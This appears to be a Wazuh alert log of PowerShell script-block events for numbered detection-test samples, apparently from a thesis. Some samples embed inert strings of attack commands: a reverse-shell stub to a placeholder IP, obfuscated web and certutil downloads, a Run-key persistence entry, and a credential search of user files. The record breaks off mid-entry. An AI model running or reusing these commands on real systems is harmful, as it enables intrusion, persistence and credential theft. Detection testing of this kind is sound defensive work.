{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"003c2d18-73d3-489a-b6b6-ebecd718ecfa","scriptBlockText":"$sampleId='PST-291'; Get-Process | Select-Object -First 5 Name, Id, CPU; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723875","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-291'; Get-Process | Select-Object -First 5 Name, Id, CPU; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 003c2d18-73d3-489a-b6b6-ebecd718ecfa\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:49.2476910Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:49.2476910Z\",\"eventRecordID\":\"723875\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-291'; Get-Process | Select-Object -First 5 Name, Id, CPU; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 003c2d18-73d3-489a-b6b6-ebecd718ecfa\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-291'; Get-Process | Select-Object -First 5 Name, Id, CPU; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"003c2d18-73d3-489a-b6b6-ebecd718ecfa\"}}}","id":"1784281069.600711","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executing process discovery","firedtimes":13,"groups":["windows"," powershell"],"id":"91815","level":4,"mail":false,"mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]}},"timestamp":"2026-07-17T11:37:49.676+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"6d2e130e-0a34-4192-b050-e165e33a2ce4","scriptBlockText":"$sampleId='PST-292'; $cfg = 'path=C:\\\\Temp;mode=audit;owner=admin;enabled=true;retry=3;hash=AA11-BB22-CC33'; Write-Output $cfg; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723891","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-292'; $cfg = 'path=C:\\Temp;mode=audit;owner=admin;enabled=true;retry=3;hash=AA11-BB22-CC33'; Write-Output $cfg; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 6d2e130e-0a34-4192-b050-e165e33a2ce4\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:49.5995160Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:49.5995160Z\",\"eventRecordID\":\"723891\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-292'; $cfg = 'path=C:\\\\Temp;mode=audit;owner=admin;enabled=true;retry=3;hash=AA11-BB22-CC33'; Write-Output $cfg; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 6d2e130e-0a34-4192-b050-e165e33a2ce4\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-292'; $cfg = 'path=C:\\\\\\\\Temp;mode=audit;owner=admin;enabled=true;retry=3;hash=AA11-BB22-CC33'; Write-Output $cfg; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"6d2e130e-0a34-4192-b050-e165e33a2ce4\"}}}","id":"1784281069.600711","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:49.781+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"a47212be-7653-431a-95b9-ba5ca16ce492","scriptBlockText":"$sampleId='PST-293'; $indicator='$cl`ient=New-Object Sy`stem.Net.Sockets.TcpClient(''203.0.113.77'',4444); $stre`am=$cl`ient.GetStr`eam(); $bu`ffer=New-Obje`ct byte[] 4096; $read=$stream.Read($bu`ffer,0,$buffer.Length)'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723893","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-293'; $indicator='$cl`ient=New-Object Sy`stem.Net.Sockets.TcpClient(''203.0.113.77'',4444); $stre`am=$cl`ient.GetStr`eam(); $bu`ffer=New-Obje`ct byte[] 4096; $read=$stream.Read($bu`ffer,0,$buffer.Length)'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: a47212be-7653-431a-95b9-ba5ca16ce492\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:50.1870110Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:50.1870110Z\",\"eventRecordID\":\"723893\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-293'; $indicator='$cl`ient=New-Object Sy`stem.Net.Sockets.TcpClient(''203.0.113.77'',4444); $stre`am=$cl`ient.GetStr`eam(); $bu`ffer=New-Obje`ct byte[] 4096; $read=$stream.Read($bu`ffer,0,$buffer.Length)'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: a47212be-7653-431a-95b9-ba5ca16ce492\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-293'; $indicator='$cl`ient=New-Object Sy`stem.Net.Sockets.TcpClient(''203.0.113.77'',4444); $stre`am=$cl`ient.GetStr`eam(); $bu`ffer=New-Obje`ct byte[] 4096; $read=$stream.Read($bu`ffer,0,$buffer.Length)'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"a47212be-7653-431a-95b9-ba5ca16ce492\"}}}","id":"1784281071.600711","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:51.194+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"2557d382-b63e-4d44-9e4d-cd84d7872218","scriptBlockText":"$sampleId='PST-294'; $parts=@('In`VOK','e-wEbrE','queST -','uRi ''HtTpS:','//fILes.','exampLE.i','NvalI','D/upd`','ate.bIN',''' -oUtfi`Le ''$','eNv:tEmP\\\\uP','da`Te.BI','n'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723898","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-294'; $parts=@('In`VOK','e-wEbrE','queST -','uRi ''HtTpS:','//fILes.','exampLE.i','NvalI','D/upd`','ate.bIN',''' -oUtfi`Le ''$','eNv:tEmP\\uP','da`Te.BI','n'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 2557d382-b63e-4d44-9e4d-cd84d7872218\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:50.5068965Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:50.5068965Z\",\"eventRecordID\":\"723898\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-294'; $parts=@('In`VOK','e-wEbrE','queST -','uRi ''HtTpS:','//fILes.','exampLE.i','NvalI','D/upd`','ate.bIN',''' -oUtfi`Le ''$','eNv:tEmP\\\\uP','da`Te.BI','n'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 2557d382-b63e-4d44-9e4d-cd84d7872218\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-294'; $parts=@('In`VOK','e-wEbrE','queST -','uRi ''HtTpS:','//fILes.','exampLE.i','NvalI','D/upd`','ate.bIN',''' -oUtfi`Le ''$','eNv:tEmP\\\\\\\\uP','da`Te.BI','n'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"2557d382-b63e-4d44-9e4d-cd84d7872218\"}}}","id":"1784281071.600711","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:51.206+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b0f95b2b-fce1-427a-b993-eb7e4b7bb01b","scriptBlockText":"$sampleId='PST-295'; Get-ExecutionPolicy -List; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723903","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-295'; Get-ExecutionPolicy -List; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b0f95b2b-fce1-427a-b993-eb7e4b7bb01b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:50.8386546Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:50.8386546Z\",\"eventRecordID\":\"723903\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-295'; Get-ExecutionPolicy -List; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b0f95b2b-fce1-427a-b993-eb7e4b7bb01b\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-295'; Get-ExecutionPolicy -List; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b0f95b2b-fce1-427a-b993-eb7e4b7bb01b\"}}}","id":"1784281071.600711","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:51.218+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"26fb289d-451e-46ef-b483-072660014997","scriptBlockText":"$sampleId='PST-296'; $indicator='certutil.exe -urlcach' + 'e -split -f ht' + 'tps://cert.examp' + 'le.invalid/blob.txt' + ' C:\\\\__THESIS_INERT__' + '\\\\blob.txt; certutil' + '.exe -decode C:' + '\\\\__THESIS_INERT' + '__\\\\blob.txt C:\\\\__T' + 'HESIS_INERT__\\\\stage.b' + 'in'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723906","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-296'; $indicator='certutil.exe -urlcach' + 'e -split -f ht' + 'tps://cert.examp' + 'le.invalid/blob.txt' + ' C:\\__THESIS_INERT__' + '\\blob.txt; certutil' + '.exe -decode C:' + '\\__THESIS_INERT' + '__\\blob.txt C:\\__T' + 'HESIS_INERT__\\stage.b' + 'in'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 26fb289d-451e-46ef-b483-072660014997\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:51.1771853Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:51.1771853Z\",\"eventRecordID\":\"723906\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-296'; $indicator='certutil.exe -urlcach' + 'e -split -f ht' + 'tps://cert.examp' + 'le.invalid/blob.txt' + ' C:\\\\__THESIS_INERT__' + '\\\\blob.txt; certutil' + '.exe -decode C:' + '\\\\__THESIS_INERT' + '__\\\\blob.txt C:\\\\__T' + 'HESIS_INERT__\\\\stage.b' + 'in'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 26fb289d-451e-46ef-b483-072660014997\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-296'; $indicator='certutil.exe -urlcach' + 'e -split -f ht' + 'tps://cert.examp' + 'le.invalid/blob.txt' + ' C:\\\\\\\\__THESIS_INERT__' + '\\\\\\\\blob.txt; certutil' + '.exe -decode C:' + '\\\\\\\\__THESIS_INERT' + '__\\\\\\\\blob.txt C:\\\\\\\\__T' + 'HESIS_INERT__\\\\\\\\stage.b' + 'in'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"26fb289d-451e-46ef-b483-072660014997\"}}}","id":"1784281071.600711","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:51.226+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"06e6ac25-e153-40c9-8367-be89a6f52d68","scriptBlockText":"$sampleId='PST-297'; $encoded='TgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AJwAgAC0ATgBhAG0AZQAgACcAVQBwAGQAYQB0AGUAQwBoAGUAYwBrACcAIAAtAFYAYQBsAHUAZQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARgBpAGwAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABzAHQAYQBnAGUALgBwAHMAMQAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723920","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-297'; $encoded='TgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AJwAgAC0ATgBhAG0AZQAgACcAVQBwAGQAYQB0AGUAQwBoAGUAYwBrACcAIAAtAFYAYQBsAHUAZQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARgBpAGwAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABzAHQAYQBnAGUALgBwAHMAMQAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 06e6ac25-e153-40c9-8367-be89a6f52d68\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:51.5145260Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:51.5145260Z\",\"eventRecordID\":\"723920\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-297'; $encoded='TgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AJwAgAC0ATgBhAG0AZQAgACcAVQBwAGQAYQB0AGUAQwBoAGUAYwBrACcAIAAtAFYAYQBsAHUAZQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARgBpAGwAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABzAHQAYQBnAGUALgBwAHMAMQAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 06e6ac25-e153-40c9-8367-be89a6f52d68\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-297'; $encoded='TgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AJwAgAC0ATgBhAG0AZQAgACcAVQBwAGQAYQB0AGUAQwBoAGUAYwBrACcAIAAtAFYAYQBsAHUAZQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARgBpAGwAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABzAHQAYQBnAGUALgBwAHMAMQAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"06e6ac25-e153-40c9-8367-be89a6f52d68\"}}}","id":"1784281072.600711","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":26,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:37:52.232+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"c96e28de-181b-4d8e-90f4-79cb32eb1001","scriptBlockText":"$sampleId='PST-298'; Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723923","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-298'; Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: c96e28de-181b-4d8e-90f4-79cb32eb1001\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:51.8469976Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:51.8469976Z\",\"eventRecordID\":\"723923\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-298'; Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: c96e28de-181b-4d8e-90f4-79cb32eb1001\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-298'; Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"c96e28de-181b-4d8e-90f4-79cb32eb1001\"}}}","id":"1784281072.602962","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":25,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:37:52.262+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"148d35f5-f2e4-4466-9b96-b5f246b7a485","scriptBlockText":"$sampleId='PST-299'; $indicator='get-chiLdIteM -PATH ''C:\\\\uSerS'' -rECurse -inClUdE ''*.ConFig'',''*.xML'' | SELeCT-STrING -pATTERn ''PaSsWord|tokEn|sEcRET'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723928","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-299'; $indicator='get-chiLdIteM -PATH ''C:\\uSerS'' -rECurse -inClUdE ''*.ConFig'',''*.xML'' | SELeCT-STrING -pATTERn ''PaSsWord|tokEn|sEcRET'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 148d35f5-f2e4-4466-9b96-b5f246b7a485\r\nPath: 